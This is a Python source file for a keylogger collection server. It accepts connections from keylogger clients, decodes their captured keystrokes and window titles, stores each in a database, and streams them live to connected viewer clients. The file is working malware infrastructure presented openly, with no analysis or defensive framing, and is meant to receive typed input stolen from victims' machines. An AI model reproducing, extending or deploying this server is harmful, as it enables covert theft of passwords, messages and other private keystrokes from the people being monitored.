import socket
import json
import threading

from datetime import datetime
from src.client.key_log import database


class KeylogServer:
    def __init__(self, host="0.0.0.0", port=5000):
        self.host = host
        self.port = port
        self.server_socket = None
        self.is_running = False

        self.view_clients = []     
        self.lock = threading.Lock()

    def start(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(20)

            print(f"[+] Server listening on {self.host}:{self.port}")
            self.is_running = True

            while self.is_running:
                client_socket, address = self.server_socket.accept()
                threading.Thread(target=self.client_handler,
                                 args=(client_socket, address),
                                 daemon=True).start()

        except Exception as e:
            print("[-] Server error:", e)
        finally:
            self.stop()

    def client_handler(self, client_socket, address):
        try:
            first_msg = client_socket.recv(1024).decode()
            info = json.loads(first_msg)

            if info.get("type") == "viewer":
                print(f"[VIEW] {address} connected")
                with self.lock:
                    self.view_clients.append(client_socket)
                self.handle_viewer(client_socket, address)

            else:
                print(f"[KEYLOG] {address} connected")
                self.handle_keylogger(client_socket, address)

        except:
            client_socket.close()

    def handle_viewer(self, client_socket, address):
        try:
            while True:
                data = client_socket.recv(1)
                if not data:
                    break
        except:
            pass
        finally:
            with self.lock:
                if client_socket in self.view_clients:
                    self.view_clients.remove(client_socket)
            print(f"[VIEW] disconnected {address}")
            client_socket.close()

    def handle_keylogger(self, client_socket, address):
        buffer = ""
        try:
            while True:
                data = client_socket.recv(4096).decode("utf-8")
                if not data:
                    break

                buffer += data
                while "\n" in buffer:
                    line, buffer = buffer.split("\n", 1)

                    try:
                        keystroke = json.loads(line)

                        ok = database.create_keystroke(
                            key_data=keystroke["KeyData"],
                            window_title=keystroke["WindowTitle"]
                        )

                        self.broadcast(keystroke)

                        if ok:
                            print(f"[✓] {address} -> {keystroke['WindowTitle']} : {keystroke['KeyData']}")
                        else:
                            print("[x] DB insert failed")

                    except:
                        print("[-] Bad JSON:", line)

        except Exception as e:
            print(f"[-] Client error {address}: {e}")

        finally:
            print(f"[KEYLOG] disconnected {address}")
            client_socket.close()

    def broadcast(self, msg):
        remove_list = []
        data = (json.dumps(msg) + "\n").encode()

        with self.lock:
            for client in self.view_clients:
                try:
                    client.sendall(data)
                except:
                    remove_list.append(client)

            for c in remove_list:
                self.view_clients.remove(c)

    def stop(self):
        print("[*] Server stopped.")
        self.is_running = False
        if self.server_socket:
            self.server_socket.close()


if __name__ == "__main__":
    KeylogServer().start()
